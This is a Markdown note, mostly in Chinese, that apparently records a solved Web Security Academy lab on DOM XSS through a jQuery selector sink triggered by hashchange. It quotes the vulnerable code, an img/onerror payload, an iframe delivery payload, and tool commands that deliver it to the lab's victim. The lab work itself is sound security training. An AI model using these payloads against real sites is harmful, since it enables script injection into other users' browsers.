---
title: "lab-jquery-selector-hash-change-event"
links:
  - target: dom-xss-family
    relation: evidences
---

# lab-jquery-selector-hash-change-event

> evidences: [[dom-xss-family]]

- 题面:DOM XSS in jQuery selector sink using a hashchange event(/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
- 实例:https://0a8f00b20377b175802da3060056008a.web-security-academy.net
- 利用服务器:https://exploit-0a7b00b803bbb1aa80a5a28401b40082.exploit-server.net
- slug:请求 slug 即真 slug(见下 lab_id)
- 判定目标:投递给受害者,使其浏览器执行 `print()`;状态:**solved**(交付后 solved_check true)

## 关键步

1. 首页载 `jquery_1-8-2.js` + `jqueryMigrate_1-4-1.js`,尾部:
   `$(window).on('hashchange', function(){ var post = $('section.blog-list h2:contains(' + decodeURIComponent(location.hash.slice(1)) + ')'); if (post) post.get(0).scrollIntoView(); });`
   —— sink 是 `$()` 选择器,hash 值可控(须触发 hashchange,初次加载不触发)。
2. 本地验证:lab_alert 导航首页 + driver `location.hash='#<img src=x onerror=alert(1)>'` → alert 实发。
3. 投递 payload:iframe 先载 `/#`,onload 再拼接使 hash 变化:
   `<iframe src="https://<inst>/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`

## 证据摘录

```
lab_alert "<inst>/" --settle-ms 2500 --driver "location.hash='#<img src=x onerror=alert(1)>'"   # 本地
 -> {"alerts":["alert:1","alert:1"],"fired":true}
# 交付(DELIVER_TO_VICTIM,并 --follow 命中 /deliver-to-victim);exploit log 见 (Victim) Chrome 的 GET /exploit/
solved_check "<inst>/" --jar /tmp/b15-jar2.json
 -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_launch launch B73AAD4EFA87DFE5458720E5A4713F2B416825E550DC9D161F58635DB7A48DCD --widget-source /web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event --jar /tmp/b15-jar2.json
lab_http post "https://<exploit>/" --form urlIsHttps=on --form responseFile=/exploit --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' --form 'responseBody=<iframe src="https://<inst>/#" onload="this.src+=&#39;<img src=x onerror=print()>&#39;"></iframe>' --form formAction=DELIVER_TO_VICTIM --follow
solved_check "<inst>/" --jar /tmp/b15-jar2.json
```
